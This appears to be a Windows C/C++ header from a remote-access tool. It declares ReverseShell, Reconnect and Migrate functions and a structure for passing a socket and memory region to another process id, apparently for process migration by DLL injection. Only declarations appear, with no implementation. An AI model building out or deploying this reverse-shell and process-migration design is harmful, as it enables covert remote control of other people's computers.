#ifndef EXTERNAL_H_INCLUDED
#define EXTERNAL_H_INCLUDED

#include <winsock2.h>
#include <cstdint>
#include <windows.h>

void ReverseShell(const char *server, const char *port);
void Reconnect();
void Migrate();

struct DllMeta_ {
    void   *where;
    size_t size;
    struct {
        uint32_t pid;
        WSAPROTOCOL_INFO *info;
    } next;
};

#endif//EXTERNAL_H_INCLUDED
